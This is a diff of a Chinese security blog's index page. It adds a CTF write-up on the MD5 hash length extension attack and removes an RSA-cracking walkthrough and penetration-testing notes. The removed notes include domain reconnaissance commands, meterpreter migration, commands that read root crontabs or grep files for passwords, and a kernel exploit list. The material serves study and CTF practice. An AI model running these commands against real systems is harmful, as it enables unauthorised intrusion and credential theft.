@@ -255,6 +255,220 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://goudanjun.vip/2021/03/20/hash长度扩展攻击.html/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="狗蛋菌">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Goudan's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2021/03/20/hash长度扩展攻击.html/" itemprop="url">hash长度扩展攻击</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-03-20T10:17:25+08:00">
+                2021-03-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  826 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  3 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="hash加密过程："><a href="#hash加密过程：" class="headerlink" title="hash加密过程："></a><strong>hash加密过程：</strong></h1><p>hash加密类似于分组加密算法，每次会处理固定长度的信息（MD5是64bit）</p>
+<p><img src="//goudanjun.vip/2021/03/20/hash长度扩展攻击/E:%5CYoudaoNote%5Clocales%5Cqq95DFC21E9D6129E6F47BDD62200B295D%5C713f77fe417245c7ba29c6d32f233359%5Cclipboard.png" alt="img"></p>
+<h1 id="MD5加密："><a href="#MD5加密：" class="headerlink" title="MD5加密："></a><strong>MD5加密：</strong></h1><ol>
+<li>首先需要将要进行message的填充，将message填充成为64的倍数（实际只需要填充到 <strong>length%64 = 56(Byte)</strong>即可，因为<strong>最后8字节</strong>是表示<strong>message的长度</strong>，MD5算法会自动添加）</li>
+<li>进行分组 ( 一组64bit ) 加密，每一组的信息会和<strong>前一组计算得出的iv向量</strong>进行一系列的复杂运算得到一个hash值和一组iv向量，如果第一组正好是64位，则第一组计算即可得出hash值。</li>
+<li>其中第一组加密的初始iv为固定值</li>
+</ol>
+<p><img src="//goudanjun.vip/2021/03/20/hash长度扩展攻击/E:%5CYoudaoNote%5Clocales%5Cqq95DFC21E9D6129E6F47BDD62200B295D%5C46c09a7f5f1f41038e9f15e6c9d30117%5Cclipboard.png" alt="img"></p>
+<p>例如：</p>
+<p>对admin进行MD5加密：</p>
+<ol>
+<li><p>message = admin</p>
+</li>
+<li><p>padding</p>
+</li>
+<li><ol>
+<li>一个\x80</li>
+<li>N个\x00</li>
+</ol>
+</li>
+<li><p>填充后：</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">61646d696e8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002800000000000000</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>hex(admin) + ‘80’ + 50*’00’ + ‘2800000000000000’</li>
+<li>后8字节 (64bit / 16位hex ) 实际上是：’0000000000000028’，填充的时候要按小端存储，逆序存储，admin是5个字节，40bit，即十六进制的28</li>
+<li>最后分组进行MD5加密</li>
+</ol>
+<h1 id="hash长度扩展攻击："><a href="#hash长度扩展攻击：" class="headerlink" title="hash长度扩展攻击："></a><strong>hash长度扩展攻击：</strong></h1><p>需要知道：salt的长度 + message的值 + salt和message经过MD5加密后的字符串 + 我们要扩充的字符串</p>
+<p>一般在实际应用中，例如在cookie或session中加密传输用户名和密码时，服务器管理员为了提高数据的混淆度，会加上在本来的message前加上一段固定长度的盐值（salt），防止恶意用户截取到用户名或密码可以直接MD5加密预测cookie或session，从而冒充用户进行登陆。因为有了salt所以我们不能直接猜测出cookie或session，这就有了hash长度扩展攻击：</p>
+<p>本来的加密过程是：</p>
+<blockquote>
+<p><strong>原始被MD5加密的字符串</strong> = salt + message + padding + length</p>
+</blockquote>
+<p>我们可以将原来的 salt+message+padding+length 看作是一个新的 salt’ 再加上我们要扩充的字符串 ( message’ ) ，计算出一个新的MD5值</p>
+<blockquote>
+<p><strong>新的被MD5加密的字符串</strong> = salt’ + message’ + padding’ + length’</p>
+<p>length’ = lenth( salt + message + padding + message’)</p>
+</blockquote>
+<p><img src="//goudanjun.vip/2021/03/20/hash长度扩展攻击/E:%5CYoudaoNote%5Clocales%5Cqq95DFC21E9D6129E6F47BDD62200B295D%5C1842fb87543b4e0e90daf4c3ef560983%5Cclipboard.png" alt="img"></p>
+<p>例如：</p>
+<p>已知原始消息为admin，salt的长度为4，要扩展的字符串是 ‘joychou’，计算 padding’ ， length’  和 新生成的MD5</p>
+<p>hex(admin) = 61646d696e</p>
+<p>hex(salt) = xxxxxxxx</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原始被MD5加密的字符串 = xxxxxxxx61646d696e80000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 </span><br><span class="line">hex($salt) + hex(&apos;admin&apos;) + &apos;80&apos; +  54*&apos;00&apos;</span><br></pre></td></tr></table></figure>
+
+<p>len(‘原始被MD5加密的字符串’) = 64</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">新的被MD5加密的字符串 = 原始被MD5加密的字符串 + hex(&apos;joychou&apos;) + 80000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 + 3802000000000000 </span><br><span class="line">新的length = len(原始被MD5加密的字符串 + &apos;joychou&apos;) = 71(Byte) = 568(bit) = 0x238 </span><br><span class="line">padding&apos;= 800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003802000000000000</span><br></pre></td></tr></table></figure>
+
+<p>新生成的MD5：06cf5a94dcda53659f58c0f411ba0bd8</p>
+<p><strong>CTF例题：</strong></p>
+<p>题目连接： <a href="http://daka.whaledu.com/web/web44/答案格式：whaleCTF{xxxx}" target="_blank" rel="noopener">http://daka.whaledu.com/web/web44/</a></p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"已知一组role为admin，salt长度为4，hash为c7813629f22b6a7d28a08041db3e80a9,想要扩展的字符串是joychou"</span>.<span class="string">"&lt;br&gt;"</span>; </span><br><span class="line">$flag = <span class="string">"**********"</span>; </span><br><span class="line">$role = $_REQUEST[<span class="string">"role"</span>]; </span><br><span class="line">$hash = $_REQUEST[<span class="string">"hash"</span>]; </span><br><span class="line">$salt = <span class="string">"***********"</span>; <span class="comment">//The length is 4 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($hash !== md5($salt.$role))&#123; <span class="comment">//这里判断加盐后的新生成的MD5和输入的MD5是否相等，若相等则可输出flag，这里就可用到我们的hash长度扩展攻击</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'wrong!'</span>;      </span><br><span class="line">    <span class="keyword">exit</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $role == <span class="string">'admin'</span>)&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'no no no !, hash cann\'t be admin'</span>; </span><br><span class="line">    <span class="keyword">exit</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//echo "You are ".$role.'&lt;/br&gt;'; </span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Congradulation! The flag is'</span>.$flag; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>利用自动填充脚本：</p>
+<p><img src="//goudanjun.vip/2021/03/20/hash长度扩展攻击/E:%5CYoudaoNote%5Clocales%5Cqq95DFC21E9D6129E6F47BDD62200B295D%5C73d09eed135b4c5e9e3377cf50655c63%5Cclipboard.png" alt="img"></p>
+<p>使用方法：</p>
+<p>python md5pad.py 已知的MD5值 需要扩展的字符串 原message和salt的长度</p>
+<p><img src="//goudanjun.vip/2021/03/20/hash长度扩展攻击/E:%5CYoudaoNote%5Clocales%5Cqq95DFC21E9D6129E6F47BDD62200B295D%5C92fae7f9177d407c96a81a68c1605900%5Cclipboard.png" alt="img"></p>
+<p>通过burp抓包，在post请求包的data中赋值并发送即可得到flag</p>
+<p><img src="//goudanjun.vip/2021/03/20/hash长度扩展攻击/E:%5CYoudaoNote%5Clocales%5Cqq95DFC21E9D6129E6F47BDD62200B295D%5C361ccba5516f49ff82751024711488fb%5Cclipboard.png" alt="img"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://goudanjun.vip/2021/03/18/RSA加密.html/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -318,7 +532,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  439 字
+                  440 字
                 </span>
               
 
@@ -356,114 +570,14 @@
 
       
         
-          
-            <a id="more"></a>
-
-<h1 id="加密过程："><a href="#加密过程：" class="headerlink" title="加密过程："></a><strong>加密过程：</strong></h1><p><img src="https://i.loli.net/2021/03/18/r1ihTuDgwcKkmqP.png" alt="img"></p>
-<p><img src="https://i.loli.net/2021/03/18/lvua4LNxADb7SdB.png" alt="img"></p>
-<p>例如：</p>
-<p><img src="https://i.loli.net/2021/03/18/dpAwK1HEi4beznh.png" alt="img"></p>
-<p>e:公钥，d:私钥</p>
-<p><strong>加密过程：</strong></p>
-<p><img src="https://i.loli.net/2021/03/18/RzVHjDNY5iGWEgJ.png" alt="img"></p>
-<p>例子：</p>
-<p>明文M = 19</p>
-<p>密文C = (19^5) mod 119 = 66</p>
-<p>公钥e = 5</p>
-<p>私钥d = 77</p>
-<p>n = 119</p>
-<p>66^77 mod 119 = ? 19</p>
-<h1 id="手工计算RSA加密："><a href="#手工计算RSA加密：" class="headerlink" title="手工计算RSA加密："></a><strong>手工计算RSA加密：</strong></h1><p><img src="https://i.loli.net/2021/03/18/42VHAu3MQCOch1K.png" alt="img"></p>
-<p>计算：66^77 mod 119</p>
-<p>1，</p>
-<p>​    77 = 0b100 1101</p>
-<p>​    0：前一位^2 mod 119</p>
-<p>​    1：（直接平方再乘原始的66） mod 119</p>
-<p>2，</p>
-<table>
-<thead>
-<tr>
-<th align="center">1</th>
-<th align="center">0</th>
-<th align="center">0</th>
-<th align="center">1</th>
-<th align="center">1</th>
-<th align="center">0</th>
-<th align="center">1</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">66</td>
-<td align="center">72</td>
-<td align="center">67</td>
-<td align="center">83</td>
-<td align="center">94</td>
-<td align="center">30</td>
-<td align="center">19</td>
-</tr>
-</tbody></table>
-<p>可用脚本：</p>
-<p><img src="https://i.loli.net/2021/03/18/U4EyHhqag8dzcJu.png" alt="img"></p>
-<p><img src="https://i.loli.net/2021/03/18/65oPBSgIL1J9hcz.png" alt="img"></p>
-<p>​    </p>
-<h1 id="RSA应用："><a href="#RSA应用：" class="headerlink" title="RSA应用："></a><strong>RSA应用：</strong></h1><p><img src="https://i.loli.net/2021/03/18/Tbtm3xhGWiIFpZ6.png" alt="img"></p>
-<h2 id="whaleCTF"><a href="#whaleCTF" class="headerlink" title="whaleCTF:"></a><strong>whaleCTF:</strong></h2><h3 id="1，密钥生成："><a href="#1，密钥生成：" class="headerlink" title="1，密钥生成："></a><strong>1，密钥生成：</strong></h3><p>题目：</p>
-<p>p=473398607161，q=4511491，e=17求解出d</p>
-<p>利用工具：</p>
-<p><img src="https://i.loli.net/2021/03/18/rh6lpGmgYZHn8Wy.png" alt="img"></p>
-<h3 id="2，RSA解密："><a href="#2，RSA解密：" class="headerlink" title="2，RSA解密："></a><strong>2，RSA解密：</strong></h3><p><strong>ZIP伪加密：</strong></p>
-<ol>
-<li>手动修改：</li>
-</ol>
-<p><img src="https://i.loli.net/2021/03/18/9hX6ykNoFLVJpPC.png" alt="img"></p>
-<ol>
-<li>ZipCenOp.jar：</li>
-</ol>
-<p>注：使用前先备份</p>
-<p><img src="https://i.loli.net/2021/03/18/8dZ1FVIj7kPhscw.png" alt="img"></p>
-<p>利用kali中的openssl：</p>
-<p><img src="https://i.loli.net/2021/03/18/MwPlC8mfAihE4X3.png" alt="img"></p>
-<p><img src="https://i.loli.net/2021/03/18/A6WOHfC3PmsJc9L.png" alt="img"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -<span class="keyword">in</span> 要解密的文件 -inkey 密钥 -out 输出文件</span><br></pre></td></tr></table></figure>
-
-<h3 id="3，RSA破解"><a href="#3，RSA破解" class="headerlink" title="3，RSA破解"></a><strong>3，RSA破解</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#模数分解： </span></span><br><span class="line">openssl rsa -pubin -text -modulus -<span class="keyword">in</span> 密钥文件 </span><br><span class="line">openssl rsa -pubin -text -modulus -<span class="keyword">in</span> public.pem</span><br></pre></td></tr></table></figure>
-
-<ol>
-<li>只给出一个公钥文件和密文，我们要利用这两个文件解密</li>
-<li>首先利用 openssl 解出公钥文件中的模数：</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -pubin -text -modulus -<span class="keyword">in</span> public.pem</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/03/18/H4eJZgKdT5Ei9Sh.png" alt="img"></p>
-<ol>
-<li>再进行模数分解，得出 p 和 q （msiexe153.exe）</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msieve153.exe 0xCA00F5ED7B33B9BD421E77318AA178E75DEDE3CB1BC7D47A7D143BE7491C9025 -v</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/03/18/XgIclW5FHUPdo82.png" alt="img"></p>
-<ol>
-<li>再生成一个模板的私钥文件，利用py脚本：</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">keypair = RSA.generate(<span class="number">1024</span>)<span class="comment">#公钥的长度</span></span><br><span class="line"></span><br><span class="line">keypair.p = <span class="number">290579950064240059571837821251441436997</span></span><br><span class="line">keypair.q = <span class="number">314436328879392457343835667929324128609</span></span><br><span class="line">keypair.e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">keypair.n = keypair.p * keypair.q</span><br><span class="line">Qn = long((keypair.p<span class="number">-1</span>) * (keypair.q<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">    x = (Qn * i ) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (x % keypair.e == <span class="number">0</span>):</span><br><span class="line">        keypair.d = x / keypair.e</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">private = open(<span class="string">'private.pem'</span>,<span class="string">'w'</span>)</span><br><span class="line">private.write(keypair.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure>
-
-<p>这个脚本最好在kali上运行，kali上有自带的库</p>
-<p><img src="https://i.loli.net/2021/03/18/dygrDbAO7n6z8Xv.png" alt="img"></p>
-<p>生成一个私钥文件：</p>
-<p><img src="https://i.loli.net/2021/03/18/Fb4cWTgC6Qd8YrH.png" alt="img"></p>
-<p><strong>注：</strong>也可以用一个工具RSAtool.py，可以直接输入p和q，再进行生成一个私钥文件：</p>
-<p>在kali上运行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python rsatool.py -p 290579950064240059571837821251441436997 -q 314436328879392457343835667929324128609 -e 65537 -o pri.pem -f PEM</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/03/18/BJM3bLikl9aXoQc.png" alt="img"></p>
-<ol>
-<li>用私钥解密flag文件：</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -<span class="keyword">in</span> flag.enc -inkey private.pem -out flag.txt</span><br></pre></td></tr></table></figure>
-
-<h2 id="oppenSSL简介："><a href="#oppenSSL简介：" class="headerlink" title="oppenSSL简介："></a><strong>oppenSSL简介：</strong></h2><p><img src="https://i.loli.net/2021/03/18/CtFEkKjbSrVD9gG.png" alt="img"></p>
-<p><img src="https://i.loli.net/2021/03/18/WyfdAbZ7QaNjC6E.png" alt="img"></p>
-
-          
+          <p>RSA</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2021/03/18/RSA加密.html/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1349,7 +1463,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  593 字
+                  592 字
                 </span>
               
 
@@ -1387,7 +1501,30 @@
 
       
         
-          <h1 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h1>
+          <h1 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h1><h2 id="powershell执行策略"><a href="#powershell执行策略" class="headerlink" title="powershell执行策略"></a>powershell执行策略</h2><table>
+<thead>
+<tr>
+<th align="center">策略</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">Restricted</td>
+<td align="center">脚本不能运行</td>
+</tr>
+<tr>
+<td align="center">AllSigned</td>
+<td align="center">仅当脚本由受信任的发布者签名时才能运行</td>
+</tr>
+<tr>
+<td align="center">RemoteSigned</td>
+<td align="center">本地创建的脚本可以运行，但从网上下的不能运行</td>
+</tr>
+<tr>
+<td align="center">Unrestricted</td>
+<td align="center">允许所有的script运行</td>
+</tr>
+</tbody></table>
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2021/03/10/PowerShell学习全记录.html/#more" rel="contents">
@@ -1542,761 +1679,14 @@
 
       
         
-          
-            <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">net user /domain		<span class="comment">#查看域用户</span></span><br><span class="line">net view /domain		<span class="comment">#查看有几个域</span></span><br><span class="line">net view /domain:XXX	<span class="comment">#查看域内主机</span></span><br><span class="line">net group /domain		<span class="comment">#查看域里面的组</span></span><br><span class="line">net group <span class="string">"domain computers"</span> /domain	<span class="comment">#查看域内所有主机名</span></span><br><span class="line">net group <span class="string">"domain admins"</span> /domain		<span class="comment">#查看域管理员</span></span><br><span class="line">net group <span class="string">"domain controllers"</span> /domain	<span class="comment">#查看域控制器</span></span><br><span class="line">net group <span class="string">"enterprise admins"</span> /domain	<span class="comment">#查看企业管理组</span></span><br><span class="line">nettime /domain			<span class="comment">#查看时间服务器</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>提权之前：第一次getshell的时候要进行进程的迁移，进而获取稳定的shell</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#手动迁移</span></span><br><span class="line">migrate &lt;PID&gt;</span><br><span class="line"><span class="comment">#自动迁移</span></span><br><span class="line">run post/windows/manage/migrate</span><br></pre></td></tr></table></figure>
-
-<h2 id="windows各漏洞对应补丁："><a href="#windows各漏洞对应补丁：" class="headerlink" title="windows各漏洞对应补丁："></a>windows各漏洞对应补丁：</h2><p><img src="https://i.loli.net/2021/03/08/bWeiuH2Cl9Xnmcw.jpg" alt="IMG_0726(20210308-110246)"><img src="https://i.loli.net/2021/03/08/2cKIuaoPyVNTCZl.jpg" alt="IMG_0727(20210308-110307)"></p>
-<h3 id="ms16-032实验："><a href="#ms16-032实验：" class="headerlink" title="ms16_032实验："></a>ms16_032实验：</h3><p>getshell后是用户权限：</p>
-<p><img src="https://i.loli.net/2021/03/08/jgHM8fcr5Eo7KlW.png" alt="image-20210308204554539"></p>
-<p>将这个session放到后台运行，搜索ms16032，设置session为刚才的session</p>
-<p><img src="https://i.loli.net/2021/03/08/gPA3LD7CSu2Bf1m.png" alt="image-20210308204708951"></p>
-<p>提权后：</p>
-<p><img src="https://i.loli.net/2021/03/08/Rev19GBgq4OVA2E.png" alt="image-20210308204751797"></p>
-<h2 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h2><h3 id="0x00-常⻅信息收集命令"><a href="#0x00-常⻅信息收集命令" class="headerlink" title="0x00 常⻅信息收集命令"></a><strong>0x00 常⻅信息收集命令</strong></h3><table>
-<thead>
-<tr>
-<th align="left">命令</th>
-<th>结果</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">uname -a</td>
-<td>打印所有可⽤的系统信息</td>
-</tr>
-<tr>
-<td align="left">cat /proc/version</td>
-<td>内核版本信息</td>
-</tr>
-<tr>
-<td align="left">cat /etc/*-release(issues)</td>
-<td>Linux发行版本信息</td>
-</tr>
-<tr>
-<td align="left">df -a</td>
-<td>文件系统信息</td>
-</tr>
-<tr>
-<td align="left">dpkg –list 2&gt;/dev/null| grep compiler |grep -v decompiler 2&gt;/dev/null &amp;&amp; yum list installed ‘gcc*’ 2&gt;/dev/null| grep gcc 2&gt;/dev/null</td>
-<td>列出可用的编辑器</td>
-</tr>
-<tr>
-<td align="left">lpstat -a</td>
-<td>查看是否有打印机</td>
-</tr>
-<tr>
-<td align="left">ps auxtop cat/etc/service</td>
-<td>查看进程相关信息</td>
-</tr>
-<tr>
-<td align="left">crontab -l；ls -alh /var/spool/cron；ls -al /etc/ | grep cron；ls -al /etc/cron<em>cat /etc/cron</em>；cat /etc/at.allow；cat /etc/at.deny；cat /etc/cron.allow；cat /etc/cron.deny；cat /etc/crontab；cat /etc/anacrontab；cat /var/spool/cron/crontabs/root</td>
-<td>查看计划任务的相关信息</td>
-</tr>
-<tr>
-<td align="left">grep -i user [filename]；grep -i pass [filename；]grep -C 5 “password” [filename]；find . -name “*.php” -print0 | xargs -0 grep-i -n “var $password”</td>
-<td>查看可能具有⼝令的⽂件</td>
-</tr>
-</tbody></table>
-<h3 id="0x01-sudo滥⽤提权"><a href="#0x01-sudo滥⽤提权" class="headerlink" title="0x01 sudo滥⽤提权"></a><strong>0x01 sudo滥⽤提权</strong></h3><p>使⽤sudo -l命令可以查看当前⽤户允许执⾏的提权命令。</p>
-<h3 id="0x02-内核漏洞提权"><a href="#0x02-内核漏洞提权" class="headerlink" title="0x02 内核漏洞提权"></a><strong>0x02 内核漏洞提权</strong></h3><p>Linux漏洞汇总（通过ExDB查找PoC）</p>
-<table>
-<thead>
-<tr>
-<th>发布时间</th>
-<th>漏洞描述</th>
-<th>发布作者</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>2019/12/16</td>
-<td>Linux 5.3 - PrivilegeEscalation via io_uringOffload of sendmsg() ontoKernel Thread with KernelCreds</td>
-<td>Google Security Research</td>
-</tr>
-<tr>
-<td>2019/10/24</td>
-<td>Linux Polkit - pkexec helperPTRACE_TRACEME localroot (Metasploit)</td>
-<td>Metasploit</td>
-</tr>
-<tr>
-<td>2019/07/17</td>
-<td>Linux - Broken Permissionand Object Lifetime Handlingfor PTRACE_TRACEME</td>
-<td>Google Security Research</td>
-</tr>
-<tr>
-<td>2018/11/29</td>
-<td>Linux - Nested UserNamespace idmap LimitLocal Privilege Escalation(Metasploit)</td>
-<td>Metasploit</td>
-</tr>
-<tr>
-<td>2018/11/16</td>
-<td>Linux - Broken uid/gidMapping for Nested UserNamespaces</td>
-<td>Google Security Research</td>
-</tr>
-<tr>
-<td>2018/09/26</td>
-<td>Linux Kernel - VMA Use-After-Free via Buggyvmacache_flush_all()Fastpath Local PrivilegeEscalation</td>
-<td>Google Security Research</td>
-</tr>
-<tr>
-<td>2018/08/03</td>
-<td>Linux Kernel - UDPFragmentation Offset ‘UFO’Privilege Escalation(Metasploit)</td>
-<td>Metasploit</td>
-</tr>
-<tr>
-<td>2018/07/19</td>
-<td>Linux - BPF Sign ExtensionLocal Privilege Escalation(Metasploit)</td>
-<td>Metasploit</td>
-</tr>
-<tr>
-<td>2018/07/10</td>
-<td>Linux Kernel &lt; 4.13.9(Ubuntu 16.04 / Fedora 27) -Local Privilege Escalation</td>
-<td>rlarabee</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th>2018/05/22</th>
-<th>Linux 4.4.0 &lt; 4.4.0-53 -‘AF_PACKET chocobo_root’Local Privilege Escalation(Metasploit)</th>
-<th>Metasploit</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>2018/05/21</td>
-<td>Linux 2.6.30 &lt; 2.6.36-rc8 -Reliable Datagram Sockets(RDS) Privilege Escalation(Metasploit)</td>
-<td>Metasploit</td>
-</tr>
-<tr>
-<td>2018/05/18</td>
-<td>Linux 4.8.0 &lt; 4.8.0-46 -AF_PACKET packet_set_ringPrivilege Escalation(Metasploit)</td>
-<td>Metasploit</td>
-</tr>
-<tr>
-<td>2017/08/13</td>
-<td>Linux Kernel &lt; 4.4.0-83 / &lt;4.8.0-58 (Ubuntu14.04/16.04) - LocalPrivilege Escalation (KASLR/ SMEP)</td>
-<td>Andrey Konovalov</td>
-</tr>
-<tr>
-<td>2017/09/06</td>
-<td>Tor (Linux) - X11 LinuxSandbox Breakout</td>
-<td>Google Security Research</td>
-</tr>
-<tr>
-<td>2017/05/22</td>
-<td>VMware Workstation forLinux 12.5.2 build-4638234- ALSA Configuration HostLocal Privilege Escalation</td>
-<td></td>
-</tr>
-<tr>
-<td>2017/05/11</td>
-<td>Linux Kernel 4.8.0-41-generic (Ubuntu) - PacketSocket Local PrivilegeEscalation</td>
-<td>Andrey Konovalov</td>
-</tr>
-<tr>
-<td>2016/11/27</td>
-<td>Linux Kernel 2.6.22 &lt; 3.9 -‘Dirty COW /proc/self/mem’Race Condition PrivilegeEscalation (/etc/passwdMethod)</td>
-<td>Gabriele Bonacini</td>
-</tr>
-<tr>
-<td>2016/11/28</td>
-<td>Linux Kernel 2.6.22 &lt; 3.9 -‘Dirty COW’’PTRACE_POKEDATA’ RaceCondition PrivilegeEscalation (/etc/passwdMethod)</td>
-<td>FireFart</td>
-</tr>
-<tr>
-<td>2016/11/14</td>
-<td>Linux Kernel 4.4 (Ubuntu16.04) - ‘BPF’ Local PrivilegeEscalation (Metasploit)</td>
-<td>Metasploit</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
